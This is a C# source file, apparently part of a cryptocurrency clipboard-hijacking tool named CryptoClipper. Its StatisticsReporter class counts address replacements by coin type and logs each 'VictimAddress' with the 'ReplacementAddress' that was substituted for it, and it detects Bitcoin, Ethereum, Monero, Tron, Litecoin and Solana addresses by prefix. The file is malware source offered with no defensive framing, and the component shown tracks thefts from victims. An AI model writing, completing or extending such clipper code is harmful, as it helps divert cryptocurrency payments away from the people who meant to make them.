using CryptoClipper.Models;

namespace CryptoClipper.Reporting;

public sealed class StatisticsReporter
{
    private readonly Lock _lock = new();
    private readonly Dictionary<CoinType, int> _replacementCounts = new();
    private DateTime _startTime = DateTime.UtcNow;

    public void RecordReplacement(ClipboardEvent evt)
    {
        lock (_lock)
        {
            var rule = new WalletReplacementRule
            {
                CoinType = DetectCoinType(evt.ReplacedContent ?? string.Empty),
                OriginalAddress = evt.OriginalContent
            };

            if (!_replacementCounts.ContainsKey(rule.CoinType))
                _replacementCounts[rule.CoinType] = 0;

            _replacementCounts[rule.CoinType]++;

            TransactionLog.Record(new TransactionLog
            {
                CoinType = rule.CoinType,
                VictimAddress = evt.OriginalContent,
                ReplacementAddress = evt.ReplacedContent ?? string.Empty
            });
        }
    }

    public Dictionary<CoinType, int> GetStats()
    {
        lock (_lock)
        {
            return new Dictionary<CoinType, int>(_replacementCounts);
        }
    }

    public TimeSpan Uptime => DateTime.UtcNow - _startTime;

    public int TotalReplacements
    {
        get
        {
            lock (_lock)
            {
                return _replacementCounts.Values.Sum();
            }
        }
    }

    private static CoinType DetectCoinType(string address)
    {
        if (address.StartsWith("bc1") || address.StartsWith('1') || address.StartsWith('3'))
            return CoinType.Bitcoin;
        if (address.StartsWith("0x"))
            return CoinType.Ethereum;
        if (address.StartsWith('4') && address.Length > 90)
            return CoinType.Monero;
        if (address.StartsWith('T') && address.Length == 34)
            return CoinType.Tron;
        if (address.StartsWith("ltc1") || address.StartsWith('L') || address.StartsWith('M'))
            return CoinType.Litecoin;

        return CoinType.Solana;
    }
}
